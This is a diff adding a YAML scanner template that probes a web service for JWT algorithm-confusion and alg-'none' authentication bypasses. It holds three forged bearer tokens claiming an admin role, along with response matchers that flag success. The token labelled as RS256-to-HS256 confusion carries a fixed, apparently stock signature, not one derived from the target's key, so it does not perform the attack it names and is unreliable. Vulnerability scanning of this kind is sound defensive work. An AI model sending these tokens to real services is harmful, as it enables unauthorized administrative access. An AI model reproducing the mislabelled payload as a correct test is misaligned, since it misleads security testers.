@@ -1,0 +1,42 @@
+# templates/jwt/jwt-algorithm-confusion.yaml
+id: jwt-algorithm-confusion
+info:
+  name: JWT Algorithm Confusion Attack
+  author: shadowxp
+  severity: high
+  description: Tests for RS256 to HS256 algorithm confusion vulnerability
+  tags:
+    - jwt
+    - algorithm
+    - confusion
+    - cve-2016-10555
+
+vulnerability_type: jwt
+
+request:
+  - method: GET
+    path: "{{BaseURL}}"
+    headers:
+      Authorization: "Bearer {{jwt_payload}}"
+    
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "admin"
+          - "success"
+          - "authenticated"
+        part: body
+
+payloads:
+  # Algorithm confusion payloads - RS256 to HS256
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+  # None algorithm bypass
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+  # Empty signature
+  - "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
+
+encoders:
+  - base64
